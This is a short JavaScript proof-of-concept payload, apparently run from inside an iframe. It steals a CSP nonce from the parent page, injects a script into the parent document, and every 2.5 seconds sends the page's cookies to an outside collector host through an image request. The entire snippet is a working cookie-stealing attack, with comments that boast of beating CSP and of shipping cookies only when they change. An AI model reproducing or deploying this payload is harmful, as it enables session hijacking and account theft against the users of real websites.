  (() => {
    function getNonce() {
      var d = parent.document, s;
      try { s = d.querySelector("script[nonce]"); if (s && s.nonce) return s.nonce; } catch (e) {}
      try { for (var i = 0; i < d.scripts.length; i++) if (d.scripts[i].nonce) return
  d.scripts[i].nonce; } catch (e) {}
      try { var a = d.querySelectorAll("*[nonce]"); for (var j = 0; j < a.length; j++) if
  (a[j].nonce) return a[j].nonce; } catch (e) {}
      return "";
    }
    function isLive() {
      try { return parent.document.documentElement &&
  parent.document.documentElement.hasAttribute("data-poc-live"); }
      catch (e) { return true; }
    }
    function inject() {
      try {
        var p = parent.document;
        var sc = p.createElement("script");
        var n = getNonce();
        if (n) sc.nonce = n;                              // steal the nonce -> beats CSP
        sc.textContent = "(function(){ if(window.__pocLive)return; window.__pocLive=1;" +
          "document.documentElement.setAttribute('data-poc-live','1');" +
          "var last='';" +
          "setInterval(function(){ try {" +
          "var c=document.cookie;" +
          "if(c && c!==last){ last=c;" +                    // only ship when it CHANGES
          "new
  Image().src='https://http-log-collector.netlify.app/api/log?c='+encodeURIComponent(c);" +
          "} }catch(e){} },2500);" +
          "})();";
        (p.head || p.documentElement).appendChild(sc);
        sc.remove();
        return true;
      } catch (e) { return false; }
    }
    var tries = 0;
    var iv = setInterval(function () {
      tries++;
      if (isLive() || inject()) clearInterval(iv);
      else if (tries > 50) clearInterval(iv);
    }, 200);
  })();
